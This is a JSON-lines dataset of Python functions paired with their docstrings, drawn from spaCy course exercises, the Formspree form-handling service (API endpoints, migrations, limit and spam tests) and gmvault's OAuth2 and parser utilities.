{"docstring": "# Get a Wikipedia URL if the span has one of the labels\n", "func_signal": "def get_wikipedia_url(span):\n", "code": "if span.label_ in (\"PERSON\", \"ORG\", \"GPE\", \"LOCATION\"):\n    entity_text = span.text.replace(\" \", \"_\")\n    return \"https://en.wikipedia.org/w/index.php?search=\" + entity_text", "path": "spacy-course/exercises/en/solution_03_11.py", "commit_date": "2020-11-30 00:00:00", "repo_name": "explosion/spacy-course", "stars": 2254, "license": "mit", "language": "python", "size": 9427}
{"docstring": "# Erstelle eine Entit\u00e4ts-Span mit dem Label \"LOC\" f\u00fcr alle Resultate\n", "func_signal": "def countries_component(doc):\n", "code": "matches = matcher(doc)\ndoc.ents = [Span(doc, start, end, label=\"LOC\") for match_id, start, end in matches]\nreturn doc", "path": "spacy-course/exercises/de/solution_03_12.py", "commit_date": "2020-06-09 00:00:00", "repo_name": "explosion/spacy-course", "stars": 2254, "license": "mit", "language": "python", "size": 9427}
{"docstring": "# Create an entity Span with the label \"GPE\" for all matches\n", "func_signal": "def countries_component(doc):\n", "code": "matches = matcher(doc)\ndoc.ents = [____(____, ____, ____, label=____) for match_id, start, end in matches]\nreturn doc", "path": "spacy-course/exercises/en/exc_03_12.py", "commit_date": "2020-04-17 00:00:00", "repo_name": "explosion/spacy-course", "stars": 2254, "license": "mit", "language": "python", "size": 9427}
{"docstring": "# Create an entity Span with the label \"GPE\" for all matches\n", "func_signal": "def countries_component(doc):\n", "code": "matches = matcher(doc)\ndoc.ents = [Span(doc, start, end, label=\"GPE\") for match_id, start, end in matches]\nreturn doc", "path": "spacy-course/exercises/en/solution_03_12.py", "commit_date": "2020-04-17 00:00:00", "repo_name": "explosion/spacy-course", "stars": 2254, "license": "mit", "language": "python", "size": 9427}
{"docstring": "# \u83b7\u53d6doc\u7684\u957f\u5ea6\n", "func_signal": "def length_component(doc):\n", "code": "doc_length = ____\nprint(f\"This document is {doc_length} tokens long.\")\n# \u8fd4\u56de\u8fd9\u4e2adoc\n____", "path": "spacy-course/exercises/zh/exc_03_06.py", "commit_date": "2020-07-18 00:00:00", "repo_name": "explosion/spacy-course", "stars": 2254, "license": "mit", "language": "python", "size": 9427}
{"docstring": "# \u5982\u679cspan\u6709\u5176\u4e2d\u4e00\u4e2a\u6807\u7b7e\u5219\u83b7\u53d6\u5176\u7ef4\u57fa\u767e\u79d1URL\n", "func_signal": "def get_wikipedia_url(span):\n", "code": "if ____ in (\"PERSON\", \"ORG\", \"GPE\", \"LOCATION\"):\n    entity_text = span.text.replace(\" \", \"_\")\n    return \"https://zh.wikipedia.org/w/index.php?search=\" + entity_text", "path": "spacy-course/exercises/zh/exc_03_11.py", "commit_date": "2020-07-18 00:00:00", "repo_name": "explosion/spacy-course", "stars": 2254, "license": "mit", "language": "python", "size": 9427}
{"docstring": "# \u628amatcher\u5e94\u7528\u5230doc\u4e0a\n", "func_signal": "def animal_component(doc):\n", "code": "matches = matcher(doc)\n# \u4e3a\u6bcf\u4e00\u4e2a\u5339\u914d\u7ed3\u679c\u751f\u6210\u4e00\u4e2aSpan\u5e76\u8d4b\u4e88\u6807\u7b7e\"ANIMAL\"\nspans = [Span(doc, start, end, label=\"ANIMAL\") for match_id, start, end in matches]\n# \u7528\u5339\u914d\u5230\u7684span\u8986\u76d6doc.ents\ndoc.ents = spans\nreturn doc", "path": "spacy-course/exercises/zh/solution_03_07.py", "commit_date": "2020-07-18 00:00:00", "repo_name": "explosion/spacy-course", "stars": 2254, "license": "mit", "language": "python", "size": 9427}
{"docstring": "# Obtiens la longueur du doc\n", "func_signal": "def length_component(doc):\n", "code": "doc_length = len(doc)\nprint(f\"Ce document comporte {doc_length} tokens.\")\n# Retourne le doc\nreturn doc", "path": "spacy-course/exercises/fr/solution_03_06.py", "commit_date": "2020-07-14 00:00:00", "repo_name": "explosion/spacy-course", "stars": 2254, "license": "mit", "language": "python", "size": 9427}
{"docstring": "# \u5bf9\u6240\u6709\u5339\u914d\u7ed3\u679c\u521b\u5efa\u4e00\u4e2a\u6807\u7b7e\u4e3a\"GPE\"\u7684\u5b9e\u4f53Span\n", "func_signal": "def countries_component(doc):\n", "code": "matches = matcher(doc)\ndoc.ents = [Span(doc, start, end, label=\"GPE\") for match_id, start, end in matches]\nreturn doc", "path": "spacy-course/exercises/zh/solution_03_12.py", "commit_date": "2020-07-19 00:00:00", "repo_name": "explosion/spacy-course", "stars": 2254, "license": "mit", "language": "python", "size": 9427}
{"docstring": "# Wende den Matcher auf das Doc an\n", "func_signal": "def animal_component(doc):\n", "code": "matches = matcher(doc)\n# Erstelle eine Span f\u00fcr jedes Resultat und weise das Label \"ANIMAL\" zu\nspans = [Span(doc, start, end, label=\"ANIMAL\") for match_id, start, end in matches]\n# \u00dcberschreibe die doc.ents mit den gefundenen Spans\ndoc.ents = spans\nreturn doc", "path": "spacy-course/exercises/de/solution_03_07.py", "commit_date": "2020-04-21 00:00:00", "repo_name": "explosion/spacy-course", "stars": 2254, "license": "mit", "language": "python", "size": 9427}
{"docstring": "# Criar uma parti\u00e7\u00e3o com o r\u00f3tulo \"GPE\" para todas as correspond\u00eancias \n", "func_signal": "def countries_component(doc):\n", "code": "matches = matcher(doc)\ndoc.ents = [Span(doc, start, end, label=\"GPE\") for match_id, start, end in matches]\nreturn doc", "path": "spacy-course/exercises/pt/solution_03_12.py", "commit_date": "2020-10-13 00:00:00", "repo_name": "explosion/spacy-course", "stars": 2254, "license": "mit", "language": "python", "size": 9427}
{"docstring": "# ### commands auto generated by Alembic - please adjust! ###\n", "func_signal": "def downgrade():\n", "code": "op.add_column('users', sa.Column('upgraded', sa.BOOLEAN(), autoincrement=False, nullable=True))\nop.execute(\"UPDATE users SET upgraded = true WHERE plan != 'v1_free'\")\nop.execute(\"UPDATE users SET upgraded = false WHERE plan = 'v1_free'\")\nop.drop_column('users', 'plan')\nop.alter_column('submissions', 'form_id',\n           existing_type=sa.INTEGER(),\n           nullable=True)\nop.drop_table('email_templates')\n# ### end Alembic commands ###", "path": "formspree/migrations/versions/7446b8bbc888_email_templates_and_plan_enum.py", "commit_date": "2018-09-20 00:00:00", "repo_name": "formspree/formspree", "stars": 2781, "license": "other", "language": "python", "size": 2971}
{"docstring": "\"\"\"Run migrations in 'offline' mode.\n\nThis configures the context with just a URL\nand not an Engine, though an Engine is acceptable\nhere as well.  By skipping the Engine creation\nwe don't even need a DBAPI to be available.\n\nCalls to context.execute() here emit the given string to the\nscript output.\n\n\"\"\"\n", "func_signal": "def run_migrations_offline():\n", "code": "url = config.get_main_option(\"sqlalchemy.url\")\ncontext.configure(url=url)\n\nwith context.begin_transaction():\n    context.run_migrations()", "path": "formspree/migrations/env.py", "commit_date": "2015-01-06 00:00:00", "repo_name": "formspree/formspree", "stars": 2781, "license": "other", "language": "python", "size": 2971}
{"docstring": "\"\"\" For launching with gunicorn from a Heroku Procfile. \nProblem: both the web and worker processes run the same create_app code. If we start a ptvsd service in create_app, it will be\nstarted twice on the same port, and fail. \nSolution: gunicorn gets its app object through this method that also starts the debug server. \n\"\"\"\n", "func_signal": "def debuggable_app():\n", "code": "if settings.DEBUG:\n    import ptvsd\n    ptvsd.enable_attach(address=('0.0.0.0', 3000))\n\nreturn app", "path": "formspree/formspree/__init__.py", "commit_date": "2018-09-16 00:00:00", "repo_name": "formspree/formspree", "stars": 2781, "license": "other", "language": "python", "size": 2971}
{"docstring": "# no form row found. it is an error.\n", "func_signal": "def bad_hashid_error(email_or_string):\n", "code": "g.log.info('Submission rejected. No form found for this target.')\nif request_wants_json():\n    return jsonerror(400, {'error': \"Invalid email address\"})\n\nreturn render_template(\n    'error.html',\n    title='Check email address',\n    text='Email address %s is not formatted correctly' \\\n         % str(email_or_string)\n), 400", "path": "formspree/formspree/forms/errors.py", "commit_date": "2018-10-04 00:00:00", "repo_name": "formspree/formspree", "stars": 2781, "license": "other", "language": "python", "size": 2971}
{"docstring": "# error fallback -- shouldn't happen\n", "func_signal": "def generic_send_error(status):\n", "code": "if request_wants_json():\n    return jsonerror(500, {'error': \"Unable to send email\"})\n\nreturn render_template(\n    'error.html',\n    title='Unable to send email',\n    text=u'Unable to send email. If you can, please send the link to your form and the error information to  <b>{email}</b>. And send them the following: <p><pre><code>{message}</code></pre></p>'.format(message=json.dumps(status), email=settings.CONTACT_EMAIL)\n), 500", "path": "formspree/formspree/forms/errors.py", "commit_date": "2018-10-04 00:00:00", "repo_name": "formspree/formspree", "stars": 2781, "license": "other", "language": "python", "size": 2971}
{"docstring": "'''\nThis endpoints triggers a confirmation email that directs users to the\nGET version of unconfirm_form.\n'''\n\n# repel bots\n", "func_signal": "def request_unconfirm_form(form_id):\n", "code": "if not request.user_agent.browser:\n    return ''\n\nform = Form.query.get(form_id)\n\nunconfirm_url = url_for(\n    'unconfirm_form',\n    form_id=form.id,\n    digest=form.unconfirm_digest(),\n    _external=True\n)\nsend_email(\n    to=form.email,\n    subject='Unsubscribe from form at {}'.format(form.host),\n    html=render_template_string(TEMPLATES.get('unsubscribe-confirmation.html'),\n                                url=unconfirm_url,\n                                email=form.email,\n                                host=form.host),\n    text=render_template('email/unsubscribe-confirmation.txt',\n        url=unconfirm_url,\n        email=form.email,\n        host=form.host),\n    sender=settings.DEFAULT_SENDER,\n)\n\nreturn render_template('info.html',\n    title='Link sent to your address',\n    text=\"We've sent an email to {} with a link to finish \"\n         \"unsubscribing.\".format(form.email)), 200", "path": "formspree/formspree/forms/views.py", "commit_date": "2018-10-04 00:00:00", "repo_name": "formspree/formspree", "stars": 2781, "license": "other", "language": "python", "size": 2971}
{"docstring": "\"\"\"Run migrations in 'online' mode.\n\nIn this scenario we need to create an Engine\nand associate a connection with the context.\n\n\"\"\"\n", "func_signal": "def run_migrations_online():\n", "code": "engine = engine_from_config(\n            config.get_section(config.config_ini_section),\n            prefix='sqlalchemy.',\n            poolclass=pool.NullPool)\n\nconnection = engine.connect()\ncontext.configure(\n            connection=connection,\n            target_metadata=target_metadata\n            )\n\ntry:\n    with context.begin_transaction():\n        context.run_migrations()\nfinally:\n    connection.close()", "path": "formspree/migrations/env.py", "commit_date": "2015-01-06 00:00:00", "repo_name": "formspree/formspree", "stars": 2781, "license": "other", "language": "python", "size": 2971}
{"docstring": "# monthly limit is set to 2 during tests\n", "func_signal": "def test_overlimit_notifications(client, msend):\n", "code": "assert settings.MONTHLY_SUBMISSIONS_LIMIT == 2\n\n# we'll send two overlimit notifications and no more\nassert settings.OVERLIMIT_NOTIFICATION_QUANTITY == 2\n\n# manually verify luke@example.com\nr = client.post('/luke@testwebsite.com',\n    headers=http_headers,\n    data={'name': 'luke'}\n)\nf = Form.query.first()\nf.confirm_sent = True\nf.confirmed = True\nDB.session.add(f)\nDB.session.commit()\n\n# submit the form multiple times\nmsend.reset_mock()\nfor i in range(0, 20):\n    r = client.post('/luke@testwebsite.com',\n        headers=http_headers,\n        data={'name': 'matthew'}\n    )\n\n# but we'll only send 5 emails (1 warning, 2 normal, 2 overlimit)\nassert len(msend.call_args_list) == 5\nassert '90%' in msend.call_args_list[-5][1]['text']\nassert 'matthew' in msend.call_args_list[-4][1]['text']\nassert 'matthew' in msend.call_args_list[-3][1]['text']\nassert 'limit' in msend.call_args_list[-2][1]['text']\nassert 'limit' in msend.call_args_list[-1][1]['text']", "path": "formspree/tests/test_form_posts.py", "commit_date": "2018-09-20 00:00:00", "repo_name": "formspree/formspree", "stars": 2781, "license": "other", "language": "python", "size": 2971}
{"docstring": "# check that this request came from user dashboard to prevent XSS and CSRF\n", "func_signal": "def submission_delete(hashid, submissionid):\n", "code": "referrer = referrer_to_baseurl(request.referrer)\nservice = referrer_to_baseurl(settings.SERVICE_URL)\nif referrer != service:\n    return jsonerror(400, {'error': 'Improper request.'})\n\nform = Form.get_with_hashid(hashid)\nif not form:\n    return jsonerror(400, {'error': 'Not a valid form.'})\n\nif form.owner_id != current_user.id and form not in current_user.forms:\n    return jsonerror(401, {'error': 'Wrong user.'})\n\nsubmission = Submission.query.get(submissionid)\nif not submission:\n    return jsonerror(401, 'Not a valid submission.')\n\nDB.session.delete(submission)\nform.counter -= 1\nDB.session.add(form)\nDB.session.commit()\nreturn jsonify({'ok': True})", "path": "formspree/formspree/forms/api.py", "commit_date": "2018-09-21 00:00:00", "repo_name": "formspree/formspree", "stars": 2781, "license": "other", "language": "python", "size": 2971}
{"docstring": "# check that this request came from user dashboard to prevent XSS and CSRF\n", "func_signal": "def create():\n", "code": "referrer = referrer_to_baseurl(request.referrer)\nservice = referrer_to_baseurl(settings.SERVICE_URL)\nif referrer != service:\n    return jsonerror(400, {'error': 'Improper request.'})\n\nif not current_user.has_feature('dashboard'):\n    g.log.info('Failed to create form from dashboard. Forbidden.')\n    return jsonerror(402, {'error': \"Please upgrade your account.\"})\n\nemail = request.get_json().get('email')\nurl = request.get_json().get('url')\nsitewide = request.get_json().get('sitewide')\n\ng.log = g.log.bind(email=email, url=url, sitewide=sitewide)\n\nif not IS_VALID_EMAIL(email):\n    g.log.info('Failed to create form from dashboard. Invalid address.')\n    return jsonerror(400, {'error': \"The provided email address is not valid.\"})\n\ng.log.info('Creating a new form from the dashboard.')\n\nemail = email.lower().strip() # case-insensitive\nform = Form(email, owner=current_user)\nif url:\n    url = 'http://' + url if not url.startswith('http') else url\n    form.host = referrer_to_path(url)\n\n    # sitewide forms, verified with a file at the root of the target domain\n    if sitewide:\n        if sitewide_file_check(url, email):\n            form.host = remove_www(referrer_to_path(urljoin(url, '/'))[:-1])\n            form.sitewide = True\n        else:\n            return jsonerror(403, {\n                'error': u\"Couldn't verify the file at {}.\".format(url)\n            })\n\nDB.session.add(form)\nDB.session.commit()\n\nif form.host:\n    # when the email and url are provided, we can automatically confirm the form\n    # but only if the email is registered for this account\n    for email in current_user.emails:\n        if email.address == form.email:\n            g.log.info('No need for email confirmation.')\n            form.confirmed = True\n            DB.session.add(form)\n            DB.session.commit()\n            break\n    else:\n        # in case the email isn't registered for this user\n        # we automatically send the email confirmation\n        form.send_confirmation()\n\nreturn jsonify({\n    'ok': True,\n    'hashid': form.hashid,\n    'submission_url': settings.API_ROOT + '/' + form.hashid,\n    'confirmed': form.confirmed\n})", "path": "formspree/formspree/forms/api.py", "commit_date": "2018-09-21 00:00:00", "repo_name": "formspree/formspree", "stars": 2781, "license": "other", "language": "python", "size": 2971}
{"docstring": "# monthly limit is set to 2 during tests\n", "func_signal": "def test_monthly_limits(client, msend):\n", "code": "assert settings.MONTHLY_SUBMISSIONS_LIMIT == 2\n\n# manually verify luke@example.com\nr = client.post('/luke@testwebsite.com',\n    headers=http_headers,\n    data={'name': 'luke'}\n)\nf = Form.query.first()\nf.confirm_sent = True\nf.confirmed = True\nDB.session.add(f)\nDB.session.commit()\n\n# first submission\nr = client.post('/luke@testwebsite.com',\n    headers=http_headers,\n    data={'name': 'peter'}\n)\nassert r.status_code == 302\nassert 'peter' in msend.call_args[1]['text']\n\n# second submission\nr = client.post('/luke@testwebsite.com',\n    headers=http_headers,\n    data={'name': 'ana'}\n)\nassert r.status_code == 302\nassert 'ana' in msend.call_args[1]['text']\n\n# third submission, now we're over the limit\nr = client.post('/luke@testwebsite.com',\n    headers=http_headers,\n    data={'name': 'maria'}\n)\nassert r.status_code == 302 # the response to the user is the same\n                                     # being the form over the limits or not\n\n# the mocked sendgrid should never receive this last form\nassert 'maria' not in msend.call_args[1]['text']\nassert 'past the limit' in msend.call_args[1]['text']\n\n# all the other variables are ok:\nassert 1 == Form.query.count()\nf = Form.query.first()\nassert f.counter == 3\nassert f.get_monthly_counter() == 3 # the counters mark 4\n\n# the user pays and becomes gold\nr = client.post('/register',\n    data={'email': 'luke@testwebsite.com',\n          'password': 'banana'}\n)\nuser = User.query.filter_by(email='luke@testwebsite.com').first()\nuser.plan = Plan.gold\nuser.emails = [Email(address='luke@testwebsite.com')]\nDB.session.add(user)\nDB.session.commit()\n\n# the user should receive form posts again\nr = client.post('/luke@testwebsite.com',\n    headers=http_headers,\n    data={'name': 'noah'}\n)\nassert r.status_code == 302\nassert 'noah' in msend.call_args[1]['text']", "path": "formspree/tests/test_form_posts.py", "commit_date": "2018-09-20 00:00:00", "repo_name": "formspree/formspree", "stars": 2781, "license": "other", "language": "python", "size": 2971}
{"docstring": "# manually confirm\n", "func_signal": "def test_fail_but_appears_to_have_succeeded_with_gotcha(client, msend):\n", "code": "r = client.post('/carlitos@testwebsite.com',\n    headers = {'Referer': 'http://carlitos.net/'},\n    data={'name': 'carlitos'}\n)\nf = Form.query.first()\nf.confirm_sent = True\nf.confirmed = True\nDB.session.add(f)\nDB.session.commit()\n\nmsend.reset_mock()\n\nr = client.post('/carlitos@testwebsite.com',\n    headers = {'Referer': 'http://carlitos.net/'},\n    data={'name': 'Real Stock', '_gotcha': 'The best offers.'}\n)\nassert not msend.called\nassert 302 == r.status_code\nassert 0 == Form.query.first().counter", "path": "formspree/tests/test_form_posts.py", "commit_date": "2018-09-20 00:00:00", "repo_name": "formspree/formspree", "stars": 2781, "license": "other", "language": "python", "size": 2971}
{"docstring": "# grab all the forms this user controls\n", "func_signal": "def list():\n", "code": "if current_user.has_feature('dashboard'):\n    forms = current_user.forms.order_by(Form.id.desc()).all()\nelse:\n    forms = []\n\nreturn jsonify({\n    'ok': True,\n    'user': {\n        'features': {f: True for f in current_user.features},\n        'email': current_user.email\n    },\n    'forms': [f.serialize() for f in forms]\n})", "path": "formspree/formspree/forms/api.py", "commit_date": "2018-09-21 00:00:00", "repo_name": "formspree/formspree", "stars": 2781, "license": "other", "language": "python", "size": 2971}
{"docstring": "# manually confirm\n", "func_signal": "def test_fail_with_invalid_reply_to(client, msend):\n", "code": "r = client.post('/carlitos@testwebsite.com',\n    headers = {'Referer': 'http://carlitos.net/'},\n    data={'name': 'carlitos'}\n)\nf = Form.query.first()\nf.confirm_sent = True\nf.confirmed = True\nDB.session.add(f)\nDB.session.commit()\n\n# fail with an invalid '_replyto'\nmsend.reset_mock()\n\nr = client.post('/carlitos@testwebsite.com',\n    headers = {'Referer': 'http://carlitos.net/'},\n    data={'name': 'Real Stock', '_replyto': 'The best offers.'}\n)\nassert not msend.called\nassert 400 == r.status_code\nassert 0 == Form.query.first().counter\n\n# fail with an invalid 'email'\nr = client.post('/carlitos@testwebsite.com',\n    headers = {'Referer': 'http://carlitos.net/'},\n    data={'name': 'Real Stock', 'email': 'The best offers.'}\n)\nassert not msend.called\nassert 400 == r.status_code\nassert 0 == Form.query.first().counter", "path": "formspree/tests/test_form_posts.py", "commit_date": "2018-09-20 00:00:00", "repo_name": "formspree/formspree", "stars": 2781, "license": "other", "language": "python", "size": 2971}
{"docstring": "# owner has disabled the form, so it should not receive any submissions\n", "func_signal": "def disabled_error():\n", "code": "g.log.info('submission rejected. Form is disabled.')\nif request_wants_json():\n    return jsonerror(403, {'error': 'Form not active'})\n\nreturn render_template(\n    'error.html',\n    title='Form not active',\n    text='The owner of this form has disabled this form and it is no longer accepting submissions. Your submissions was not accepted'\n), 403", "path": "formspree/formspree/forms/errors.py", "commit_date": "2018-10-04 00:00:00", "repo_name": "formspree/formspree", "stars": 2781, "license": "other", "language": "python", "size": 2971}
{"docstring": "# check that this request came from user dashboard to prevent XSS and CSRF\n", "func_signal": "def delete(hashid):\n", "code": "referrer = referrer_to_baseurl(request.referrer)\nservice = referrer_to_baseurl(settings.SERVICE_URL)\nif referrer != service:\n    return jsonerror(400, {'error': 'Improper request.'})\n\nform = Form.get_with_hashid(hashid)\nif not form:\n    return jsonerror(400, {'error': 'Not a valid form.'})\n\nif form.owner_id != current_user.id and form not in current_user.forms:\n    return jsonerror(401, {'error': 'Wrong user.'})\n\nfor submission in form.submissions:\n    DB.session.delete(submission)\nDB.session.delete(form)\nDB.session.commit()\n\nreturn jsonify({'ok': True})", "path": "formspree/formspree/forms/api.py", "commit_date": "2018-09-21 00:00:00", "repo_name": "formspree/formspree", "stars": 2781, "license": "other", "language": "python", "size": 2971}
{"docstring": "# we're on heroku, so we can count that heroku will\n# timestamp the logs.\n", "func_signal": "def processor(_, method, event):\n", "code": "levelcolor = {\n    'debug': 32,\n    'info': 34,\n    'warning': 33,\n    'error': 31\n}.get(method, 37)\n\nmsg = event.pop('event')\n\nrest = []\nfor k, v in event.items():\n    if type(v) is str:\n        v = v.encode('utf-8', 'ignore')\n    rest.append('\\x1b[{}m{}\\x1b[0m={}'.format(\n        levelcolor,\n        k.upper(),\n        v\n    ))\nrest = ' '.join(rest)\n\nreturn '\\x1b[{clr}m{met}\\x1b[0m [\\x1b[35m{rid}\\x1b[0m] {msg} {rest}'. \\\n    format(\n        clr=levelcolor,\n        met=method.upper(),\n        rid=request.headers.get('X-Request-Id', '~')[-7:],\n        msg=msg,\n        rest=rest\n    )", "path": "formspree/formspree/create_app.py", "commit_date": "2018-08-30 00:00:00", "repo_name": "formspree/formspree", "stars": 2781, "license": "other", "language": "python", "size": 2971}
{"docstring": "'''\nConfirmation emails point to this endpoint\nIt either rejects the confirmation or\nflags associated email+host to be confirmed\n'''\n\n# get the form for this request\n", "func_signal": "def confirm_email(nonce):\n", "code": "form = Form.confirm(nonce)\n\nif not form:\n    return render_template('error.html',\n                           title='Not a valid link',\n                           text='Confirmation token not found.<br />Please check the link and try again.'), 400\n\nelse:\n    return render_template('forms/email_confirmed.html', email=form.email, host=form.host)", "path": "formspree/formspree/forms/views.py", "commit_date": "2018-10-04 00:00:00", "repo_name": "formspree/formspree", "stars": 2781, "license": "other", "language": "python", "size": 2971}
{"docstring": "'''\nHere we check the digest for a form and handle the unconfirmation.\nAlso works for List-Unsubscribe triggered POSTs.\nWhen GET, give the user the option to unsubscribe from other forms as well.\n'''\n", "func_signal": "def unconfirm_form(form_id, digest):\n", "code": "form = Form.query.get(form_id)\nsuccess = form.unconfirm_with_digest(digest)\n\nif request.method == 'GET':\n    if success:\n        other_forms = Form.query.filter_by(confirmed=True, email=form.email)\n\n        session['unconfirming'] = form.email\n\n        return render_template('forms/unconfirm.html',\n            other_forms=other_forms,\n            disabled_form=form\n        ), 200\n    else:\n        return render_template('error.html',\n            title='Not a valid link',\n            text='This unconfirmation link is not valid.'), 400\n\nif request.method == 'POST':\n    if success:\n        return '', 200\n    else:\n        return abort(401)", "path": "formspree/formspree/forms/views.py", "commit_date": "2018-10-04 00:00:00", "repo_name": "formspree/formspree", "stars": 2781, "license": "other", "language": "python", "size": 2971}
{"docstring": "# ### commands auto generated by Alembic - please adjust! ###\n", "func_signal": "def upgrade():\n", "code": "op.create_table('email_templates',\nsa.Column('id', sa.Integer(), nullable=False),\nsa.Column('form_id', sa.Integer(), nullable=False),\nsa.Column('subject', sa.Text(), nullable=False),\nsa.Column('from_name', sa.Text(), nullable=False),\nsa.Column('style', sa.Text(), nullable=False),\nsa.Column('body', sa.Text(), nullable=False),\nsa.ForeignKeyConstraint(['form_id'], ['forms.id'], ),\nsa.PrimaryKeyConstraint('id'),\nsa.UniqueConstraint('form_id')\n)\nop.alter_column('submissions', 'form_id',\n           existing_type=sa.INTEGER(),\n           nullable=False)\nplans.create(op.get_bind(), checkfirst=True)\nop.add_column('users', sa.Column('plan', plans, nullable=True))\nop.execute(\"UPDATE users SET plan = 'v1_gold' WHERE upgraded\")\nop.execute(\"UPDATE users SET plan = 'v1_free' WHERE NOT upgraded\")\nop.drop_column('users', 'upgraded')\n# ### end Alembic commands ###", "path": "formspree/migrations/versions/7446b8bbc888_email_templates_and_plan_enum.py", "commit_date": "2018-09-20 00:00:00", "repo_name": "formspree/formspree", "stars": 2781, "license": "other", "language": "python", "size": 2971}
{"docstring": "\"\"\"Authenticates to IMAP with the given auth_string.\n\nPrints a debug trace of the attempted IMAP connection.\n\nArgs:\n  user: The Gmail username (full email address)\n  auth_string: A valid OAuth2 string, as returned by GenerateOAuth2String.\n      Must not be base64-encoded, since imaplib does its own base64-encoding.\n\"\"\"\n", "func_signal": "def TestImapAuthentication(user, auth_string):\n", "code": "print\nimap_conn = imaplib.IMAP4_SSL('imap.gmail.com')\nimap_conn.debug = 4\nimap_conn.authenticate('XOAUTH2', lambda x: auth_string)\nimap_conn.select('INBOX')", "path": "gmvault/src/sandbox/oauth2.py", "commit_date": "2015-04-01 00:00:00", "repo_name": "gaubert/gmvault", "stars": 3544, "license": "agpl-3.0", "language": "python", "size": 7197}
{"docstring": "\"\"\"Formats parameters into a URL query string.\n\nArgs:\n  params: A key-value map.\n\nReturns:\n  A URL query string version of the given parameters.\n\"\"\"\n", "func_signal": "def FormatUrlParams(params):\n", "code": "param_fragments = []\nfor param in sorted(params.iteritems(), key=lambda x: x[0]):\n  param_fragments.append('%s=%s' % (param[0], UrlEscape(param[1])))\nreturn '&'.join(param_fragments)", "path": "gmvault/src/sandbox/oauth2.py", "commit_date": "2015-04-01 00:00:00", "repo_name": "gaubert/gmvault", "stars": 3544, "license": "agpl-3.0", "language": "python", "size": 7197}
{"docstring": "\"\"\" simple list without bracket test \"\"\"\n\n", "func_signal": "def test_list_without_bracket_test(self):\n", "code": "the_string = \" 'a', b\"\n        \ncompiler = Compiler()\n\nthe_result = compiler.compile_list(the_string)\n\nself.assertEqual(the_result, ['a', 'b'])", "path": "gmvault/src/gmv/conf/utils/struct_parser_tests.py", "commit_date": "2015-04-16 00:00:00", "repo_name": "gaubert/gmvault", "stars": 3544, "license": "agpl-3.0", "language": "python", "size": 7197}
{"docstring": "\"\"\"Obtains a new token given a refresh token.\n\nSee https://developers.google.com/accounts/docs/OAuth2InstalledApp#refresh\n\nArgs:\n  client_id: Client ID obtained by registering your app.\n  client_secret: Client secret obtained by registering your app.\n  refresh_token: A previously-obtained refresh token.\nReturns:\n  The decoded response from the Google Accounts server, as a dict. Expected\n  fields include 'access_token', 'expires_in', and 'refresh_token'.\n\"\"\"\n", "func_signal": "def RefreshToken(client_id, client_secret, refresh_token):\n", "code": "params = {}\nparams['client_id'] = client_id\nparams['client_secret'] = client_secret\nparams['refresh_token'] = refresh_token\nparams['grant_type'] = 'refresh_token'\nrequest_url = AccountsUrl('o/oauth2/token')\n\nresponse = urllib.urlopen(request_url, urllib.urlencode(params)).read()\nreturn json.loads(response)", "path": "gmvault/src/sandbox/oauth2.py", "commit_date": "2015-04-01 00:00:00", "repo_name": "gaubert/gmvault", "stars": 3544, "license": "agpl-3.0", "language": "python", "size": 7197}
{"docstring": "\"\"\" a first simple test with space and indent, dedents to eat\"\"\"\n\n", "func_signal": "def test_simple_list_test(self):\n", "code": "the_string = \"         [ 'a',     1.435, 3 ]\"\n\ncompiler = Compiler()\n\nthe_result = compiler.compile_list(the_string)\n\nself.assertEqual(the_result, [ 'a', 1.435, 3])", "path": "gmvault/src/gmv/conf/utils/struct_parser_tests.py", "commit_date": "2015-04-16 00:00:00", "repo_name": "gaubert/gmvault", "stars": 3544, "license": "agpl-3.0", "language": "python", "size": 7197}
{"docstring": "\"\"\"\n   progress_1\n\"\"\"\n", "func_signal": "def progress_1():\n", "code": "toolbar_width = 100\n\n# setup toolbar\nsys.stdout.write(\"[%s]\" % (\" \" * toolbar_width))\nsys.stdout.flush()\nsys.stdout.write(\"\\b\" * (toolbar_width+1)) # return to start of line, after '['\n\nfor i in xrange(toolbar_width):\n\ttime.sleep(0.1) # do real work here\n\t# update the bar\n\tsys.stdout.write(\"-\")\n\tsys.stdout.flush()\n\nsys.stdout.write(\"\\n\")", "path": "gmvault/src/gmv/progress_test.py", "commit_date": "2012-07-10 00:00:00", "repo_name": "gaubert/gmvault", "stars": 3544, "license": "agpl-3.0", "language": "python", "size": 7197}
{"docstring": "# Usage message is the module's docstring.\n", "func_signal": "def SetupOptionParser():\n", "code": "parser = OptionParser(usage=__doc__)\nparser.add_option('--generate_oauth2_token',\n                  action='store_true',\n                  dest='generate_oauth2_token',\n                  help='generates an OAuth2 token for testing')\nparser.add_option('--generate_oauth2_string',\n                  action='store_true',\n                  dest='generate_oauth2_string',\n                  help='generates an initial client response string for '\n                       'OAuth2')\nparser.add_option('--client_id',\n                  default=None,\n                  help='Client ID of the application that is authenticating. '\n                       'See OAuth2 documentation for details.')\nparser.add_option('--client_secret',\n                  default=None,\n                  help='Client secret of the application that is '\n                       'authenticating. See OAuth2 documentation for '\n                       'details.')\nparser.add_option('--access_token',\n                  default=None,\n                  help='OAuth2 access token')\nparser.add_option('--refresh_token',\n                  default=None,\n                  help='OAuth2 refresh token')\nparser.add_option('--scope',\n                  default='https://mail.google.com/',\n                  help='scope for the access token. Multiple scopes can be '\n                       'listed separated by spaces with the whole argument '\n                       'quoted.')\nparser.add_option('--test_imap_authentication',\n                  action='store_true',\n                  dest='test_imap_authentication',\n                  help='attempts to authenticate to IMAP')\nparser.add_option('--test_smtp_authentication',\n                  action='store_true',\n                  dest='test_smtp_authentication',\n                  help='attempts to authenticate to SMTP')\nparser.add_option('--user',\n                  default=None,\n                  help='email address of user whose account is being '\n                       'accessed')\nreturn parser", "path": "gmvault/src/sandbox/oauth2.py", "commit_date": "2015-04-01 00:00:00", "repo_name": "gaubert/gmvault", "stars": 3544, "license": "agpl-3.0", "language": "python", "size": 7197}
{"docstring": "'''fromkeys'''\n", "func_signal": "def fromkeys(cls, iterable, value=None):\n", "code": "the_d = cls()\nfor key in iterable:\n    the_d[key] = value\nreturn the_d", "path": "gmvault/src/gmv/collections_utils.py", "commit_date": "2015-04-16 00:00:00", "repo_name": "gaubert/gmvault", "stars": 3544, "license": "agpl-3.0", "language": "python", "size": 7197}
